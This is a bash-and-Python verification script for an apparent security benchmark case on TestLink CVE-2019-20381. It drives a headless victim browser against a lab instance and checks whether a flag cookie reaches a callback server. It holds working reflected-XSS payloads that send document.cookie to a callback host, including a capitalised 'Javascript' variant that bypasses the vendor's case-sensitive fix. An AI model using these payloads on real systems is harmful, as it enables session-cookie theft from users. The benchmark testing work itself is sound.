#!/usr/bin/env bash
# verify.sh for PCBV2-0028 testlink-cve-2019-20381 (CVE-2019-19491 -> CVE-2019-20381)
# Flag channel = exfil callback (/dump): a headless Chromium victim logs into the REAL
# TestLink (admin/admin), plants ${PCB_FLAG} in a cookie, and VISITS the crafted
# index.php?...&reqURI=<payload>&... URL. If the reflected reqURI yields an executable
# onload on the main frame/iframe, it fires a beacon to the internal callback carrying
# document.cookie -> the flag appears in /dump (proving JS EXECUTION).
#   --seed     : reqURI = javascript" onload="...   -> V0 (1.9.19, no guard) executes;
#                V1 (1.9.19.1, case-SENSITIVE strpos('javascript')) blanks it -> no exfil.
#   --residual : reqURI = Javascript" onload="...   -> no lowercase 'javascript' substring
#                -> strpos misses on V1 -> reflected raw -> executes -> flag exfiltrated.
# 0=效果发生 10=未发生 20=环境失败 30=参数错误
set -uo pipefail
: "${RUN_ID:?}" "${COMPOSE_PROJECT_NAME:?}" "${RUN_FLAG:?}" "${VERSION:?}" "${WORK_DIR:?}"
MODE="${1:-}"
[[ "$MODE" == "--seed" || "$MODE" == "--residual" ]] || { echo "usage: --seed|--residual" >&2; exit 30; }
CASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
PY="${PCB_PYTHON:-python3}"
REF="$RUN_FLAG"   # 判定基准：RUN_FLAG_REF，回退 RUN_FLAG
mkdir -p "$WORK_DIR"

# 端口动态解析（app 服务名 = 版本名 v0/v1/v2；victim/callback 为常驻服务）
resolve_ports() {
  APP_PORT="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" \
              port "$VERSION" 80 2>/dev/null | sed -E 's/.*:([0-9]+)$/\1/' | tr -d '[:space:]' | tail -1 || true)"
  VICT_PORT="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" \
               port victim 8070 2>/dev/null | sed -E 's/.*:([0-9]+)$/\1/' | tr -d '[:space:]' | tail -1 || true)"
  CB_PORT="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" \
             port callback 9000 2>/dev/null | sed -E 's/.*:([0-9]+)$/\1/' | tr -d '[:space:]' | tail -1 || true)"
}
resolve_ports
if [[ -z "$APP_PORT" || -z "$VICT_PORT" || -z "$CB_PORT" ]]; then
  echo "ports missing (app=$APP_PORT victim=$VICT_PORT callback=$CB_PORT); compose up" >&2
  docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" --profile "$VERSION" up -d --pull never >/dev/null 2>&1 || true
  sleep 8
  resolve_ports
fi
if [[ -z "$APP_PORT" || -z "$VICT_PORT" || -z "$CB_PORT" ]]; then
  echo "cannot resolve ports (app=$APP_PORT victim=$VICT_PORT callback=$CB_PORT) for project $COMPOSE_PROJECT_NAME" >&2
  exit 20
fi
echo "target app=$APP_PORT victim=$VICT_PORT callback=$CB_PORT version=$VERSION mode=$MODE"

OUT="$("$PY" - "$APP_PORT" "$VICT_PORT" "$CB_PORT" "$VERSION" "$MODE" "$REF" <<'PYEOF'
import json, sys, time, urllib.parse, urllib.request, urllib.error

app_port, vict_port, cb_port = int(sys.argv[1]), int(sys.argv[2]), int(sys.argv[3])
version, mode, ref = sys.argv[4], sys.argv[5], sys.argv[6]

# Internal compose URLs the victim browser uses (Docker DNS by service name == version).
internal = f"http://{version}"
victim = f"http://127.0.0.1:{vict_port}"
cb = f"http://127.0.0.1:{cb_port}"

def http_get(url, timeout=150):
    with urllib.request.urlopen(url, timeout=timeout) as r:
        return r.read().decode("utf-8", "replace")

# 1) readiness: app answers HTTP (Apache up; DB may still be seeding -> retry).
ready = False
for _ in range(40):
    try:
        http_get(f"http://127.0.0.1:{app_port}/login.php", timeout=5)
        ready = True
        break
    except Exception:
        time.sleep(3)
if not ready:
    print(json.dumps({"error": "app not ready"})); sys.exit(20)
# victim HTTP endpoint up?
for _ in range(40):
    try:
        if "ok" in http_get(victim + "/health", timeout=5):
            break
    except Exception:
        time.sleep(3)
else:
    print(json.dumps({"error": "victim not ready"})); sys.exit(20)

# 2) probe payload (same sink as the seed; residual differs by ONE char: J capitalised).
if mode == "--seed":
    payload = 'javascript" onload="new Image().src=\'//callback:9000/c?f=\'+document.cookie'
else:
    payload = 'Javascript" onload="new Image().src=\'//callback:9000/c?f=\'+document.cookie'

target = internal + "/index.php?" + urllib.parse.urlencode(
    {"caller": "login", "reqURI": payload, "viewer": "3"})
q = urllib.parse.urlencode({"target": target, "origin": internal})

# 3) reset callback, drive the victim, read the dump.
http_get(cb + "/reset", timeout=10)
vresp = ""
last_err = ""
for _ in range(6):
    try:
        vresp = http_get(victim + "/visit?" + q, timeout=150)
        if vresp.strip() == "done":
            break
        last_err = vresp[:200]
    except Exception as e:
        last_err = str(e)
        time.sleep(8)
else:
    print(json.dumps({"error": f"visit failed: {last_err}"})); sys.exit(20)
dump = http_get(cb + "/dump", timeout=10)
print(json.dumps({"visit": vresp.strip(), "flag_seen": ref in dump, "dump": dump[:300]}))

sys.exit(0 if ref in dump else 10)
PYEOF
)"
RC=$?
echo "$OUT" | head -c 600; echo
exit "$RC"
